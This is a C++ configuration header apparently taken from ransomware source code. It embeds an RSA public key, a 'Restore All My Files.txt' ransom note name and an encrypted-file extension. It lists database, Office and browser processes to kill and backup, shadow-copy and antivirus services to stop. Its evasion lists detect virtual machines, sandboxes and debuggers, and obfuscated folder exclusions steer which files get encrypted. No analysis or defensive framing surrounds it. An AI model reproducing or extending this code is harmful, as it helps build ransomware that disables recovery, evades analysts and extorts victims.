#ifndef __IHKEY_CONFIG__
#define __IHKEY_CONFIG__


#include "include.h"

#include "xorstr.hpp"


#ifndef DEBUG
	#define DEBUG
#endif // !DEBUG



#if _WIN32 || _WIN64
#if _WIN64
#define ENV64BIT
#else
#define ENV32BIT
#endif
#endif


const std::string _IHKEY_PUBLIC_KEY_ = xorstr_(
	"MIIBoDANBgkqhkiG9w0BAQEFAAOCAY0AMIIBiAKCAYEAjKDvKUnr6NWgXK4nhVrPOMrbjBXg"
	"+W0/XrsN/QqBNO77T37A//M0zIHhhEvs5n+B2qYqOyW3tY7KVuSqsVqKYTy8zOal1PL+LoX+"
	"ZvBI9QLwhc/AfKHLcYAKR8M836K56nSQdKH8/Y047CpehAOrnSDOBnbQ3yUZvmcGLonP+tSN"
	"yi5qOFb8pgP8Y6+cC/L39FkBT5TT7g6BG5atEVjLYmLmPA3NqJ91xhz+yl4AnErFkfypMj3P"
	"z+fiheOHZMSyZlNaagRWWMKZAJHtPoVaQZLnPyVMK6PGKl+9m6qoQSeb160vloSf0pVKz2lg"
	"Ri2qW3XrD7/E7w91OEe/yCyB2W73ushWbYIMpJrv9kWALCqws4SvgDFe3B7kxQHRu7J7QJPZ"
	"PG52H49ilapz7GG3u/s++xry+aKP3EuDKZHbnbdeoJafRhoTDI1pqDGgaSPOYbJAw9E/A544"
	"9+9Okqt3v0ObnZqRikTk86poTYPaVt79RcFtEtzKjsOHm/o3eWZ5AgER"
);





const std::wstring _NAME = xorstr_(L"Restore All My Files.txt");
const std::wstring _EXT = L".__IHK__";


inline const char* BlackListProccVM[] =
{ 
	"vmtoolsd.exe",
	"vmwaretray.exe",
	"vmwareuser.exe",
	"VGAuthService.exe" ,
	"vmacthlp.exe" 
};

static const WCHAR* processes[] = 
{ 
	xorstr_(L"sql.exe"),
	xorstr_(L"oracle.exe"),
	xorstr_(L"ocssd.exe"),
	xorstr_(L"dbsnmp.exe"),
	xorstr_(L"synctime.exe"),
	xorstr_(L"agntsvc.exe"),
	xorstr_(L"isqlplussvc.exe"),
	xorstr_(L"xfssvccon.exe"),
	xorstr_(L"mydesktopservice.exe"),
	xorstr_(L"ocautoupds.exe"),
	xorstr_(L"encsvc.exe"),
	xorstr_(L"firefox.exe"),
	xorstr_(L"tbirdconfig.exe"),
	xorstr_(L"mydesktopqos.exe"),
	xorstr_(L"ocomm.exe"),
	xorstr_(L"dbeng50.exe"),
	xorstr_(L"sqbcoreservice.exe"),
	xorstr_(L"excel.exe"),
	xorstr_(L"infopath.exe"),
	xorstr_(L"msaccess.exe"),
	xorstr_(L"mspub.exe"),
	xorstr_(L"onenote.exe"),
	xorstr_(L"outlook.exe"),
	xorstr_(L"powerpnt.exe"),
	xorstr_(L"steam.exe"),
	xorstr_(L"thebat.exe"),
	xorstr_(L"thunderbird.exe"),
	xorstr_(L"visio.exe"),
	xorstr_(L"winword.exe"),
	xorstr_(L"wordpad.exe"),
	xorstr_(L"notepad.exe")
};

inline const CHAR* services[] = 
{ 
	"autotimesvc"
	"vmicvss",
	"vss", "sql",
	"svc$", 
	"memtas",
	"autotimesvc"
	"mepocs",
	"sophos",
	"veeam", 
	"backup",
	"docker"
	"GxVss", 
	"GxBlr", 
	"GxFWD", 
	"GxCVD", 
	"GxCIMgr",
	"DefWatch", 
	"ccEvtMgr",
	"ccSetMgr", 
	"SavRoam", 
	"RTVscan", 
	"QBFCService", 
	"QBIDPService", 
	"Intuit.QuickBooks.FCS",
	"QBCFMonitorService", 
	"YooBackup",
	"YooIT", 
	"zhudongfangyu", 
	"sophos", 
	"stc_raw_agent",
	"VSNAPVSS", 
	"VeeamTransportSvc", 
	"VeeamDeploymentService",
	"VeeamNFSSvc", 
	"veeam", 
	"PDVFSService", 
	"BackupExecVSSProvider",
	"BackupExecAgentAccelerator",
	"BackupExecAgentBrowser", 
	"BackupExecDiveciMediaService",
	"BackupExecJobEngine",
	"BackupExecManagementService", 
	"BackupExecRPCService", 
	"AcrSch2Svc",
	"AcronisAgent",
	"CASAD2DWebSvc", 
	"CAARCUpdateSvc" 
};


inline const TCHAR* BlackListDLL[] =
{
	_T("avghookx.dll"),		// AVG
	_T("avghooka.dll"),		// AVG
	_T("snxhk.dll"),		// Avast
	_T("sbiedll.dll"),		// Sandboxie
	_T("dbghelp.dll"),		// WindBG
	_T("api_log.dll"),		// iDefense Lab
	_T("dir_watch.dll"),	// iDefense Lab
	_T("pstorec.dll"),		// SunBelt Sandbox
	_T("vmcheck.dll"),		// Virtual PC
	_T("wpespy.dll"),		// WPE Pro
	_T("cmdvrt64.dll"),		// Comodo Container
	_T("cmdvrt32.dll"),		// Comodo Container
	_T("vboxdisp.dll"),
	_T("vboxhook.dll"),
	_T("vboxmrxnp.dll"),
	_T("vboxogl.dll"),
	_T("vboxoglcrutil.dll"),
	_T("vboxoglpackspu.dll"),
	_T("vboxoglerrorspu.dll"),
	_T("vboxoglfeedbackspu.dll"),


};

inline const TCHAR* BlackListFilesNames[] = 
{
		_T("sample.exe"),
		_T("bot.exe"),
		_T("sandbox.exe"),
		_T("malware.exe"),
		_T("test.exe"),
		_T("klavme.exe"),
		_T("wannacry.exe"),
		_T("ran.exe"),
		_T("ransomware.exe"),
		_T("Petya.exe")
};

inline const TCHAR* BlackListDevices[] =
{
		_T("\\\\.\\VBoxMiniRdrDN"),
		_T("\\\\.\\VBoxGuest"),
		_T("\\\\.\\pipe\\VBoxMiniRdDN"),
		_T("\\\\.\\VBoxTrayIPC"),
		_T("\\\\.\\pipe\\VBoxTrayIPC"),
		_T("\\Device\\VBoxGuest")

};

inline const TCHAR* BlackListUsersNames[] =
{
		_T("CurrentUser"),
		_T("Sandbox"),
		_T("Malware"),
		_T("Test")

};

inline const TCHAR* VBOXszPaths[] = {
	_T("System32\\drivers\\VBoxMouse.sys"),
	_T("System32\\drivers\\VBoxGuest.sys"),
	_T("System32\\drivers\\VBoxSF.sys"),
	_T("System32\\drivers\\VBoxVideo.sys"),
	_T("System32\\vboxdisp.dll"),
	_T("System32\\vboxhook.dll"),
	_T("System32\\vboxmrxnp.dll"),
	_T("System32\\vboxogl.dll"),
	_T("System32\\vboxoglarrayspu.dll"),
	_T("System32\\vboxoglcrutil.dll"),
	_T("System32\\vboxoglerrorspu.dll"),
	_T("System32\\vboxoglfeedbackspu.dll"),
	_T("System32\\vboxoglpackspu.dll"),
	_T("System32\\vboxoglpassthroughspu.dll"),
	_T("System32\\vboxservice.exe"),
	_T("System32\\vboxtray.exe"),
	_T("System32\\VBoxControl.exe"),
};

inline const WCHAR* BlackListDB[] =
{
	xorstr_(_T("WINDBG.EXE")),
	xorstr_(_T("DB.EXE")),
	xorstr_(_T("X32DBG.EXE")),
	xorstr_(_T("X64DBG.EXE")),
	xorstr_(_T("IMMUNITYDEBUGGER.EXE")),
	xorstr_(_T("MSVSMON.EXE"))
};

inline const char* BlackListRunningProc[] =
{
	xorstr_("WINDBG.EXE"),
	xorstr_("DB.EXE"),
	xorstr_("X32DBG.EXE"),
	xorstr_("X64DBG.EXE"),
	xorstr_("IMMUNITYDEBUGGER.EXE"),
	xorstr_("WIRESHARK.EXE"),
	xorstr_("MSVSMON.EXE")

};



inline std::vector<std::wstring> BLACKLISTED_FILENAMES =
{
	xorstr_(L"Windows"),
	xorstr_(L"Windows.old"),
	xorstr_(L"Internet Explorer"),
	xorstr_(L"Google"),
	xorstr_(L"Opera"),
	xorstr_(L".."),
	xorstr_(L"."),
	xorstr_(L"Recovery"),
	xorstr_(L"All Users"),
	xorstr_(L"Opera Software"),
	xorstr_(L"Mozilla"),
	xorstr_(L"AppData"),
	xorstr_(L"tmp"),
	xorstr_(L"temp"),
	xorstr_(L"node_modules"),
	xorstr_(L"thumb"),
	xorstr_(L"System Volume Information"),
	xorstr_(L"Boot"),
	xorstr_(L"lib"),
	xorstr_(L"libs"),
	xorstr_(L"$SysReset"),
	xorstr_(L"EFI"),
	xorstr_(L"Trend Micro"),
	xorstr_(L"Mozilla Firefox"),
	xorstr_(L"$Recycle.Bin"),
	xorstr_(L"ProgramData"),
	xorstr_(L"SteamLibrary"),
	xorstr_(L"EA Games"),
	xorstr_(L"Programs"),
	xorstr_(L"$RECYCLE.BIN"),
	xorstr_(L"VS Cache"),
	xorstr_(L"VS 2022 Community"),
	xorstr_(L"Windows Kits"),
	xorstr_(L"VS SDK"),
	xorstr_(L"Windows10Upgrade"),
	xorstr_(L"windows 11 kit"),
	xorstr_(L"windows 10 kit"),
	xorstr_(L"AMD"),
	xorstr_(L"INTEL"),
	xorstr_(L"Temporary Internet Files"),
	xorstr_(L"Windows11Upgrade"),
	xorstr_(L"Program Files"),
	xorstr_(L"Program Files (x86)"),
	xorstr_(L"autorun.inf"),
	xorstr_(L"boot.ini"),
	xorstr_(L"bootfont.bin"),
	xorstr_(L"bootsect.bak"),
	xorstr_(L"bootmgr"),
	xorstr_(L"bootmgr.efi"),
	xorstr_(L"bootmgfw.efi"),
	xorstr_(L"desktop.ini"),
	xorstr_(L"iconcache.db"),
	xorstr_(L"ntldr"),
	xorstr_(L"ntuser.dat"),
	xorstr_(L"ntuser.dat.log"),
	xorstr_(L"ntuser.ini"),
	xorstr_(L"thumbs.db"),
	xorstr_(L"ecdh_pub_k.bin"),
	xorstr_(L"Program Files"),
	xorstr_(L"Program Files (x86)")
};





#endif // !__IHKEY_CONFIG__


